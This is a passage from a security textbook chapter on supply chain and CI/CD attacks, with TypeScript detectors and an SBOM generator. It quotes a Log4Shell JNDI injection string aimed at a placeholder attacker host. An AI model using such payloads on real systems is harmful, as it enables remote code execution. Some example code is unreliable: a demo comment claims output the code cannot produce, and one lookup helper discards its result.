# Chapter 16: Supply Chain & CI/CD Pipeline Security

---

## Learning Objectives

By the end of this chapter, you will be able to:

1. **Analyze** real-world software supply chain attacks (SolarWinds, Codecov, log4j) and identify the technical vectors used.
2. **Generate and validate** SBOM (Software Bill of Materials) documents in SPDX and CycloneDX formats.
3. **Implement** dependency vulnerability scanning using tools like npm audit, Snyk, and OWASP Dependency Check.
4. **Harden** CI/CD pipelines against common attack vectors including secret leakage, runner compromise, and dependency confusion.
5. **Apply** artifact integrity verification using Sigstore, Cosign, and TUF.
6. **Integrate** DevSecOps tooling (SAST, DAST, secrets scanning, container scanning) into automated pipelines.
7. **Implement** SLSA provenance attestation at various maturity levels (L0–L4).
8. **Build** TypeScript utilities for SBOM generation, vulnerability auditing, pipeline security auditing, and dependency confusion detection.

---

## 16.1 The Software Supply Chain Threat Landscape

Modern software development relies on an intricate web of dependencies, build tools, CI/CD pipelines, package registries, and distribution mechanisms. Each link in this chain represents a potential attack surface. The software supply chain encompasses everything from the upstream open-source libraries you import to the container images you deploy and the pipeline that builds them.

### 16.1.1 Why Supply Chain Attacks Are Rising

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-1-why-supply-chain-attacks-are-rising-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-1-why-supply-chain-attacks-are-rising-handwritten.svg" alt="Handwritten: 16.1.1 Why Supply Chain Attacks Are Rising" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-1-why-supply-chain-attacks-are-rising-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-1-why-supply-chain-attacks-are-rising-diagram.svg" alt="Diagram: 16.1.1 Why Supply Chain Attacks Are Rising" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-1-why-supply-chain-attacks-are-rising-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-1-why-supply-chain-attacks-are-rising-sticky.svg" alt="Sticky Note: 16.1.1 Why Supply Chain Attacks Are Rising" width="30%">
</a>


Supply chain attacks have surged because they offer attackers multiplicative returns. Compromising a single upstream dependency can infect thousands of downstream consumers. The 2024 Sonatype State of the Software Supply Chain report documented a 742% average annual increase in software supply chain attacks over the past five years. Key drivers include:

- **Open-source ubiquity**: Over 90% of modern applications use open-source components, with the average project containing over 500 transitive dependencies.
- **Automated consumption**: CI/CD pipelines and package managers automatically pull dependencies, often without integrity verification.
- **Trust delegation**: Developers implicitly trust package registries, maintainers, and build infrastructure.
- **Complex dependency graphs**: A single top-level dependency can pull in dozens of transitive dependencies, creating an opaque attack surface.

### 16.1.2 Anatomy of a Supply Chain Attack

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-2-anatomy-of-a-supply-chain-attack-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-2-anatomy-of-a-supply-chain-attack-handwritten.svg" alt="Handwritten: 16.1.2 Anatomy of a Supply Chain Attack" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-2-anatomy-of-a-supply-chain-attack-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-2-anatomy-of-a-supply-chain-attack-diagram.svg" alt="Diagram: 16.1.2 Anatomy of a Supply Chain Attack" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-2-anatomy-of-a-supply-chain-attack-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-1-2-anatomy-of-a-supply-chain-attack-sticky.svg" alt="Sticky Note: 16.1.2 Anatomy of a Supply Chain Attack" width="30%">
</a>


The following Mermaid diagram illustrates the typical attack chain in a software supply chain compromise:

```mermaid
flowchart LR
    A[Attacker] -->|1. Compromise upstream| B[Package Registry / Repo]
    B -->|2. Inject malicious code| C[Compromised Package v2.1.3]
    C -->|3. Pulled by CI/CD| D[Developer's Build Pipeline]
    D -->|4. Build includes backdoor| E[Artifact / Container Image]
    E -->|5. Signed & Published| F[Production Registry]
    F -->|6. Deployed to| G[Customer Environment]
    G -->|7. Beacon home| A
    A -->|8. Exfiltrate data / Ransomware| G

    style A fill:#ff4444,color:#fff
    style C fill:#ff4444,color:#fff
    style G fill:#ffcc00,color:#000
```

**Figure 16.1**: Supply chain attack chain showing the cascading effect of a single compromised upstream package.

---

## 16.2 Major Supply Chain Attacks — Technical Deep Dive

### 16.2.1 SolarWinds (Sunburst) Attack — 2020

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-1-solarwinds-sunburst-attack-2020-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-1-solarwinds-sunburst-attack-2020-handwritten.svg" alt="Handwritten: 16.2.1 SolarWinds (Sunburst) Attack — 2020" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-1-solarwinds-sunburst-attack-2020-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-1-solarwinds-sunburst-attack-2020-diagram.svg" alt="Diagram: 16.2.1 SolarWinds (Sunburst) Attack — 2020" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-1-solarwinds-sunburst-attack-2020-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-1-solarwinds-sunburst-attack-2020-sticky.svg" alt="Sticky Note: 16.2.1 SolarWinds (Sunburst) Attack — 2020" width="30%">
</a>


The SolarWinds attack remains the most sophisticated software supply chain compromise in history. Attackers affiliated with APT29 (Cozy Bear) compromised SolarWinds' build infrastructure and inserted a backdoor into Orion software updates.

**Technical details:**

1. **Initial compromise**: Attackers gained access to SolarWinds' internal systems, likely through a compromised VPN credential or a spear-phishing attack.

2. **Build pipeline injection**: Malicious code was inserted into the `Orion.Core.BusinessLayer.dll` assembly during the build process. The attackers modified the source code in SolarWinds' build environment to include a backdoor component.

3. **The Sunburst backdoor**: The injected code used a domain generation algorithm (DGA) to beacon to command-and-control (C2) servers. The code was designed to:
   - Sleep for 12–14 days before beaconing (evading sandbox detection).
   - Use multiple C2 domains with DNS-based communication.
   - Accept "jobs" (arbitrary code execution) delivered via DNS responses.
   - Employ multiple anti-analysis techniques including C2 domain hashing and delayed activation.

4. **Supply chain propagation**: SolarWinds digitally signed the compromised Orion binaries using their legitimate code-signing certificate. This meant that customers' systems trusted the updates automatically.

5. **Downstream impact**: Approximately 18,000 organizations downloaded the compromised update. High-value targets included US federal agencies (Treasury, Commerce, DHS, Energy), cybersecurity firms (FireEye), and Fortune 500 companies.

**Key lessons for CI/CD security:**

- Build pipeline integrity must be maintained at the highest level.
- Code signing alone does not verify that the code being signed is trustworthy.
- Supply chain monitoring must include behavioral analysis, not just signature verification.
- SBOMs would have allowed organizations to rapidly identify if they were using Orion.

### 16.2.2 Codecov Breach — 2021

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-2-codecov-breach-2021-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-2-codecov-breach-2021-handwritten.svg" alt="Handwritten: 16.2.2 Codecov Breach — 2021" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-2-codecov-breach-2021-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-2-codecov-breach-2021-diagram.svg" alt="Diagram: 16.2.2 Codecov Breach — 2021" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-2-codecov-breach-2021-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-2-codecov-breach-2021-sticky.svg" alt="Sticky Note: 16.2.2 Codecov Breach — 2021" width="30%">
</a>


In April 2021, attackers modified the Codecov Bash Uploader script to exfiltrate environment variables from CI/CD pipelines.

**Attack mechanics:**

```mermaid
flowchart LR
    A[Attacker] -->|1. Compromise Codecov GCP account| B[Codecov Docker Image]
    B -->|2. Modify uploader.sh| C[Bash Uploader Script]
    C -->|3. Developer runs CI build| D[CI Pipeline]
    D -->|4. uploader.sh sourced| E[CI Environment]
    E -->|5. Exfiltrated env vars| F[Attacker C2]
    F -->|6. Access cloud credentials| G[AWS / GCP / GitHub]

    style A fill:#ff4444,color:#fff
    style F fill:#ff4444,color:#fff
```

**Technical impact:**
- The modified Bash Uploader script sent environment variables from CI runners to the attacker's server.
- Thousands of organizations that used Codecov had their CI secrets, cloud credentials, and private keys exposed.
- Affected companies included Confluent, HashiCorp, and Twilio.
- The breach demonstrated that even security tools can become attack vectors.

### 16.2.3 Log4j (Log4Shell) — CVE-2021-44228

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-3-log4j-log4shell-cve-2021-44228-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-3-log4j-log4shell-cve-2021-44228-handwritten.svg" alt="Handwritten: 16.2.3 Log4j (Log4Shell) — CVE-2021-44228" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-3-log4j-log4shell-cve-2021-44228-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-3-log4j-log4shell-cve-2021-44228-diagram.svg" alt="Diagram: 16.2.3 Log4j (Log4Shell) — CVE-2021-44228" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-3-log4j-log4shell-cve-2021-44228-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-3-log4j-log4shell-cve-2021-44228-sticky.svg" alt="Sticky Note: 16.2.3 Log4j (Log4Shell) — CVE-2021-44228" width="30%">
</a>


The Log4j vulnerability is a critical remote code execution (RCE) flaw in the Apache Log4j 2 Java logging library. While not a supply chain attack in the traditional sense, its impact was amplified by the software supply chain.

**Technical RCE chain:**

```
1. User input: ${jndi:ldap://attacker.com/evil-class}
   ↓
2. Log4j parses JNDI lookup in log message
   ↓
3. JNDI lookup resolves via LDAP to attacker-controlled server
   ↓
4. Attacker server responds with serialized Java class
   ↓
5. Log4j deserializes and executes arbitrary code
   ↓
6. Complete system compromise
```

**Supply chain implications:**
- Log4j is an Apache Software Foundation project used by millions of applications.
- The vulnerability was introduced in Log4j 2.0 (2014) and existed for 7 years before discovery.
- Organizations had to urgently inventory all uses of Log4j across their software supply chain.
- Many organizations discovered Log4j as a transitive dependency (e.g., a library they used depended on Log4j).
- This event was a watershed moment for SBOM adoption.

### 16.2.4 Dependency Confusion

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-4-dependency-confusion-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-4-dependency-confusion-handwritten.svg" alt="Handwritten: 16.2.4 Dependency Confusion" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-4-dependency-confusion-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-4-dependency-confusion-diagram.svg" alt="Diagram: 16.2.4 Dependency Confusion" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-4-dependency-confusion-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-4-dependency-confusion-sticky.svg" alt="Sticky Note: 16.2.4 Dependency Confusion" width="30%">
</a>


Dependency confusion (also called namespace confusion) occurs when a package manager installs a package from a public registry instead of a private registry because the public package has a higher version number.

**Classic attack flow:**

```typescript
/**
 * Simulates a dependency confusion attack scenario.
 * Demonstrates how npm resolves package versions when
 * both a private and public registry have the same package name.
 */
interface RegistryResolution {
  packageName: string;
  privateVersion: string | null;
  publicVersion: string | null;
  resolvedFrom: 'private' | 'public';
  isExploitable: boolean;
}

interface DependencyConfusionVerdict {
  packageName: string;
  resolution: RegistryResolution;
  riskLevel: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'NONE';
  recommendation: string;
}

function simulateDependencyConfusion(
  packageName: string,
  privateVersion: string | null,
  publicVersion: string | null,
  npmScopeConfigured: boolean
): DependencyConfusionVerdict {
  const resolution: RegistryResolution = {
    packageName,
    privateVersion,
    publicVersion,
    resolvedFrom: 'public',
    isExploitable: false,
  };

  // If no scoped registry is configured and the public version
  // is higher, npm installs from public registry (attack scenario)
  if (!npmScopeConfigured && publicVersion !== null) {
    resolution.resolvedFrom = 'public';
    resolution.isExploitable = true;

    if (privateVersion !== null) {
      const compareVersions = (a: string, b: string): number => {
        const partsA = a.split('.').map(Number);
        const partsB = b.split('.').map(Number);
        for (let i = 0; i < Math.max(partsA.length, partsB.length); i++) {
          const aVal = partsA[i] ?? 0;
          const bVal = partsB[i] ?? 0;
          if (aVal !== bVal) return aVal - bVal;
        }
        return 0;
      };
      if (publicVersion !== null && compareVersions(publicVersion, privateVersion) > 0) {
        resolution.isExploitable = true;
      }
    }
  }

  const riskMap: Record<string, DependencyConfusionVerdict['riskLevel']> = {
    true: 'CRITICAL',
    false: 'LOW',
  };

  const verdict: DependencyConfusionVerdict = {
    packageName,
    resolution,
    riskLevel: riskMap[String(resolution.isExploitable)],
    recommendation: resolution.isExploitable
      ? `Package "${packageName}" resolves to the public registry. `
        + `Use @scope/package naming or configure .npmrc to scope this package to your private registry.`
      : `Package "${packageName}" resolves safely to private registry.`,
  };

  return verdict;
}

// Demonstration
const verdict1 = simulateDependencyConfusion(
  'internal-auth-lib',
  '1.2.0',
  '99.0.0', // Attacker published this high version publicly
  false     // No npm scope configured — VULNERABLE
);
console.log('[Dependency Confusion]', verdict1);
// Output: riskLevel: 'CRITICAL', resolvedFrom: 'public'

const verdict2 = simulateDependencyConfusion(
  '@company/internal-auth-lib',
  '1.2.0',
  '99.0.0',
  true // Scoped package — SAFE
);
console.log('[Scoped Package Safe]', verdict2);
// Output: riskLevel: 'LOW', resolvedFrom: 'private'
```

### 16.2.5 Typosquatting and Malicious Packages

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-5-typosquatting-and-malicious-packages-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-5-typosquatting-and-malicious-packages-handwritten.svg" alt="Handwritten: 16.2.5 Typosquatting and Malicious Packages" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-5-typosquatting-and-malicious-packages-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-5-typosquatting-and-malicious-packages-diagram.svg" alt="Diagram: 16.2.5 Typosquatting and Malicious Packages" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-5-typosquatting-and-malicious-packages-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-2-5-typosquatting-and-malicious-packages-sticky.svg" alt="Sticky Note: 16.2.5 Typosquatting and Malicious Packages" width="30%">
</a>


Attackers publish packages with names that are slight misspellings of popular packages:

| Legitimate Package | Typosquatted Variant | Impact |
|---|---|---|
| `lodash` | `l0dash` (letter O → zero) | Data exfiltration |
| `babel-core` | `bable-core` | Credential theft |
| `node-fetch` | `node-fetch` (hidden zero-width chars) | Arbitrary code execution |
| `cross-env` | `cross-env` (Unicode homoglyph) | Environment variable theft |
| `request` | `request` (deprecated — malware found in abandoned packages) | Credential harvesting |

**Malicious package detection approach:**

```typescript
/**
 * Typosquatting detector that uses Levenshtein distance and
 * homoglyph detection to flag potentially malicious packages.
 */
interface PackageReport {
  requestedName: string;
  closestLegitimateMatch: string | null;
  editDistance: number;
  containsHomoglyphs: boolean;
  verdict: 'SAFE' | 'SUSPICIOUS' | 'MALICIOUS';
  reason: string;
}

class TyposquattingDetector {
  private readonly legitimatePackages: Set<string>;
  private readonly homoglyphMap: Map<string, string>;

  constructor(legitimatePackages: string[]) {
    this.legitimatePackages = new Set(legitimatePackages);
    this.homoglyphMap = new Map([
      ['0', 'o'], ['O', 'o'],
      ['1', 'l'], ['I', 'l'], ['l', 'i'],
      ['5', 's'], ['S', 's'],
      ['8', 'b'], ['B', 'b'],
      ['ё', 'е'], ['é', 'e'], ['è', 'e'],
      ['а', 'a'], // Cyrillic 'а'
      ['с', 'c'], // Cyrillic 'с'
      ['е', 'e'], // Cyrillic 'e'
      ['о', 'o'], // Cyrillic 'o'
      ['р', 'p'], // Cyrillic 'p'
      ['х', 'x'], // Cyrillic 'х'
      ['і', 'i'], // Cyrillic 'i'
    ]);
  }

  /**
   * Compute Levenshtein distance between two strings.
   */
  private levenshteinDistance(a: string, b: string): number {
    const dp: number[][] = Array.from({ length: a.length + 1 }, () =>
      Array(b.length + 1).fill(0)
    );
    for (let i = 0; i <= a.length; i++) dp[i][0] = i;
    for (let j = 0; j <= b.length; j++) dp[0][j] = j;
    for (let i = 1; i <= a.length; i++) {
      for (let j = 1; j <= b.length; j++) {
        const cost = a[i - 1] === b[j - 1] ? 0 : 1;
        dp[i][j] = Math.min(
          dp[i - 1][j] + 1,
          dp[i][j - 1] + 1,
          dp[i - 1][j - 1] + cost
        );
      }
    }
    return dp[a.length][b.length];
  }

  /**
   * Normalize homoglyph characters to their latin equivalents.
   */
  private normalizeHomoglyphs(input: string): string {
    return input
      .split('')
      .map((ch) => this.homoglyphMap.get(ch) ?? ch)
      .join('');
  }

  /**
   * Check if a string contains Unicode homoglyph characters.
   */
  private hasHomoglyphs(input: string): boolean {
    for (const ch of input) {
      if (this.homoglyphMap.has(ch)) return true;
    }
    return false;
  }

  /**
   * Find the closest legitimate package name.
   */
  private findClosestMatch(input: string): {
    name: string;
    distance: number;
  } | null {
    const normalizedInput = this.normalizeHomoglyphs(input).toLowerCase();
    let best: { name: string; distance: number } | null = null;

    for (const legit of this.legitimatePackages) {
      const normalizedLegit = legit.toLowerCase();
      if (normalizedLegit === normalizedInput) {
        return { name: legit, distance: 0 };
      }
      const dist = this.levenshteinDistance(normalizedInput, normalizedLegit);
      if (dist <= 3 && (best === null || dist < best.distance)) {
        best = { name: legit, distance: dist };
      }
    }
    return best;
  }

  /**
   * Scan a package name for potential typosquatting.
   */
  scan(packageName: string): PackageReport {
    const hasHomoglyphs = this.hasHomoglyphs(packageName);
    const closest = this.findClosestMatch(packageName);

    if (closest === null) {
      return {
        requestedName: packageName,
        closestLegitimateMatch: null,
        editDistance: Infinity,
        containsHomoglyphs: hasHomoglyphs,
        verdict: 'SAFE',
        reason: 'No similar legitimate package found.',
      };
    }

    if (closest.distance === 0) {
      return {
        requestedName: packageName,
        closestLegitimateMatch: closest.name,
        editDistance: 0,
        containsHomoglyphs: hasHomoglyphs,
        verdict: 'SAFE',
        reason: 'Package name matches a legitimate package exactly.',
      };
    }

    const isHighRisk = hasHomoglyphs || closest.distance <= 1;
    return {
      requestedName: packageName,
      closestLegitimateMatch: closest.name,
      editDistance: closest.distance,
      containsHomoglyphs: hasHomoglyphs,
      verdict: isHighRisk ? 'MALICIOUS' : 'SUSPICIOUS',
      reason: isHighRisk
        ? `Package "${packageName}" closely resembles "${closest.name}" `
          + `(distance: ${closest.distance})${hasHomoglyphs ? ' with homoglyph characters' : ''}. `
          + `Likely typosquatting.`
        : `Package "${packageName}" is similar to "${closest.name}" `
          + `(distance: ${closest.distance}). Verify manually.`,
    };
  }
}

// Demonstration
const detector = new TyposquattingDetector([
  'lodash', 'babel-core', 'node-fetch', 'express', 'request',
  'mongoose', 'axios', 'chalk', 'commander', 'async',
]);

const scans = ['l0dash', 'bable-core', 'express', 'async', 'ax10s', 'mοngoose'];
for (const pkg of scans) {
  console.log(detector.scan(pkg));
}
```

---

## 16.3 Software Bill of Materials (SBOM)

A Software Bill of Materials (SBOM) is a formal, machine-readable inventory of all components in a software artifact. It lists every dependency, including transitive dependencies, version information, and license data.

### 16.3.1 SBOM Formats

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-1-sbom-formats-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-1-sbom-formats-handwritten.svg" alt="Handwritten: 16.3.1 SBOM Formats" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-1-sbom-formats-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-1-sbom-formats-diagram.svg" alt="Diagram: 16.3.1 SBOM Formats" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-1-sbom-formats-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-1-sbom-formats-sticky.svg" alt="Sticky Note: 16.3.1 SBOM Formats" width="30%">
</a>


| Format | Standard Body | Format Type | Key Features |
|---|---|---|---|
| **SPDX** | Linux Foundation | RDF/XML, Tag:Value, JSON, YAML | Legal/license focus, ISO 5962:2021 |
| **CycloneDX** | OWASP | JSON, XML | Security-focused, vulnerability mapping, service components |
| **SWID** | ISO/IEC 19770-2:2015 | XML | Tag-based, ISO standard, software identity focus |

### 16.3.2 CycloneDX SBOM Generator (TypeScript)

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-2-cyclonedx-sbom-generator-typescript-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-2-cyclonedx-sbom-generator-typescript-handwritten.svg" alt="Handwritten: 16.3.2 CycloneDX SBOM Generator (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-2-cyclonedx-sbom-generator-typescript-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-2-cyclonedx-sbom-generator-typescript-diagram.svg" alt="Diagram: 16.3.2 CycloneDX SBOM Generator (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-2-cyclonedx-sbom-generator-typescript-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-3-2-cyclonedx-sbom-generator-typescript-sticky.svg" alt="Sticky Note: 16.3.2 CycloneDX SBOM Generator (TypeScript)" width="30%">
</a>


```typescript
/**
 * CycloneDX SBOM Generator
 *
 * Parses a project's package.json and node_modules directory
 * to produce a valid CycloneDX 1.5 JSON SBOM document.
 */

import * as fs from 'fs';
import * as path from 'path';
import { createHash } from 'crypto';

/* ─── Type Definitions ─── */

interface PackageJson {
  name: string;
  version: string;
  description?: string;
  license?: string;
  dependencies?: Record<string, string>;
  devDependencies?: Record<string, string>;
}

interface CycloneDXSBOM {
  bomFormat: 'CycloneDX';
  specVersion: '1.5';
  serialNumber: string;
  version: number;
  metadata: {
    timestamp: string;
    tools: Array<{ vendor: string; name: string; version: string }>;
    component: CycloneDXComponent;
    properties?: Array<{ name: string; value: string }>;
  };
  components: CycloneDXComponent[];
  dependencies: CycloneDXDependency[];
}

interface CycloneDXComponent {
  type: 'application' | 'library' | 'framework' | 'container' | 'file';
  'bom-ref': string;
  name: string;
  version: string;
  description?: string;
  licenses?: Array<{ license: { id: string } }>;
  hashes?: Array<{
    alg: 'SHA-1' | 'SHA-256' | 'SHA-512' | 'MD5';
    content: string;
  }>;
  purl?: string;
  externalReferences?: Array<{
    type: 'vcs' | 'website' | 'issue-tracker' | 'advisories';
    url: string;
  }>;
}

interface CycloneDXDependency {
  ref: string;
  dependsOn: string[];
}

/* ─── SBOM Generator ─── */

class CycloneDXSBOMGenerator {
  private readonly projectRoot: string;

  constructor(projectRoot: string) {
    this.projectRoot = projectRoot;
  }

  /**
   * Compute SHA-256 hash of a file.
   */
  private computeFileHash(filePath: string): string | null {
    try {
      const content = fs.readFileSync(filePath);
      return createHash('sha256').update(content).digest('hex');
    } catch {
      return null;
    }
  }

  /**
   * Parse a component's package.json to extract metadata.
   */
  private parseComponentPackageJson(componentPath: string): PackageJson | null {
    const pkgJsonPath = path.join(componentPath, 'package.json');
    if (!fs.existsSync(pkgJsonPath)) return null;
    try {
      return JSON.parse(fs.readFileSync(pkgJsonPath, 'utf-8')) as PackageJson;
    } catch {
      return null;
    }
  }

  /**
   * Recursively scan node_modules to discover all installed packages.
   */
  private scanNodeModules(
    nodeModulesPath: string,
    depth: number = 0
  ): Map<string, CycloneDXComponent> {
    const components = new Map<string, CycloneDXComponent>();

    if (depth > 5 || !fs.existsSync(nodeModulesPath)) return components;

    const entries = fs.readdirSync(nodeModulesPath, { withFileTypes: true });

    for (const entry of entries) {
      if (entry.name.startsWith('.')) continue;

      if (entry.name.startsWith('@')) {
        // Handle scoped packages (@scope/name)
        const scopePath = path.join(nodeModulesPath, entry.name);
        if (entry.isDirectory()) {
          const subEntries = fs.readdirSync(scopePath, { withFileTypes: true });
          for (const subEntry of subEntries) {
            if (subEntry.isDirectory()) {
              const pkgFullName = `${entry.name}/${subEntry.name}`;
              const pkgDir = path.join(scopePath, subEntry.name);
              const component = this.buildComponent(pkgFullName, pkgDir);
              if (component) {
                components.set(component['bom-ref'], component);
              }
              // Recurse for nested node_modules
              const nested = this.scanNodeModules(
                path.join(pkgDir, 'node_modules'),
                depth + 1
              );
              nested.forEach((v, k) => components.set(k, v));
            }
          }
        }
      } else if (entry.isDirectory()) {
        const pkgDir = path.join(nodeModulesPath, entry.name);
        const component = this.buildComponent(entry.name, pkgDir);
        if (component) {
          components.set(component['bom-ref'], component);
        }
        // Recurse for nested node_modules
        const nested = this.scanNodeModules(
          path.join(pkgDir, 'node_modules'),
          depth + 1
        );
        nested.forEach((v, k) => components.set(k, v));
      }
    }

    return components;
  }

  /**
   * Build a CycloneDX component from a package directory.
   */
  private buildComponent(
    packageName: string,
    packageDir: string
  ): CycloneDXComponent | null {
    const pkgJson = this.parseComponentPackageJson(packageDir);
    if (!pkgJson) return null;

    const bomRef = `pkg:npm/${packageName}@${pkgJson.version}`;
    const mainEntry = pkgJson.main || 'index.js';
    const mainPath = path.join(packageDir, mainEntry);
    const hash = this.computeFileHash(mainPath);

    const component: CycloneDXComponent = {
      type: 'library',
      'bom-ref': bomRef,
      name: packageName,
      version: pkgJson.version,
      description: pkgJson.description,
      purl: `pkg:npm/${packageName}@${pkgJson.version}`,
    };

    if (pkgJson.license) {
      component.licenses = [{ license: { id: pkgJson.license } }];
    }

    if (hash) {
      component.hashes = [{ alg: 'SHA-256', content: hash }];
    }

    return component;
  }

  /**
   * Build the dependency graph for the SBOM.
   */
  private buildDependencyGraph(
    rootComponent: CycloneDXComponent,
    allComponents: Map<string, CycloneDXComponent>
  ): CycloneDXDependency[] {
    const dependencies: CycloneDXDependency[] = [];
    const visited = new Set<string>();

    const resolveDependencies = (
      componentRef: string,
      currentDepth: number
    ): string[] => {
      if (currentDepth > 10 || visited.has(componentRef)) return [];
      visited.add(componentRef);

      const component = allComponents.get(componentRef);
      if (!component) return [];

      const componentDir = this.findComponentDir(component.name, component.version);
      if (!componentDir) return [];

      const pkgJson = this.parseComponentPackageJson(componentDir);
      if (!pkgJson) return [];

      const deps = {
        ...(pkgJson.dependencies ?? {}),
        ...(pkgJson.devDependencies ?? {}),
      };

      const depRefs: string[] = [];
      for (const [depName] of Object.entries(deps)) {
        // Find the matching component
        for (const [ref, comp] of allComponents) {
          if (comp.name === depName) {
            depRefs.push(ref);
            break;
          }
        }
      }

      dependencies.push({
        ref: componentRef,
        dependsOn: depRefs,
      });

      for (const depRef of depRefs) {
        resolveDependencies(depRef, currentDepth + 1);
      }

      return depRefs;
    };

    resolveDependencies(rootComponent['bom-ref'], 0);
    return dependencies;
  }

  private findComponentDir(
    name: string,
    version: string
  ): string | null {
    // Check direct node_modules
    const direct = path.join(this.projectRoot, 'node_modules', name);
    if (fs.existsSync(direct)) return direct;

    // Check nested node_modules
    const searchDir = path.join(this.projectRoot, 'node_modules');
    this.findNestedDir(searchDir, name);
    return null;
  }

  private findNestedDir(basePath: string, targetName: string): string | null {
    if (!fs.existsSync(basePath)) return null;
    const entries = fs.readdirSync(basePath, { withFileTypes: true });
    for (const entry of entries) {
      if (entry.isDirectory()) {
        const fullPath = path.join(basePath, entry.name);
        if (entry.name === targetName) return fullPath;
        if (entry.name !== 'node_modules') continue;
        const result = this.findNestedDir(fullPath, targetName);
        if (result) return result;
      }
    }
    return null;
  }

  /**
   * Generate the complete CycloneDX SBOM.
   */
  generate(): CycloneDXSBOM {
    const rootPkgPath = path.join(this.projectRoot, 'package.json');
    const rootPkg = JSON.parse(
      fs.readFileSync(rootPkgPath, 'utf-8')
    ) as PackageJson;

    const rootComponent: CycloneDXComponent = {
      type: 'application',
      'bom-ref': `pkg:npm/${rootPkg.name}@${rootPkg.version}`,
      name: rootPkg.name,
      version: rootPkg.version,
      description: rootPkg.description,
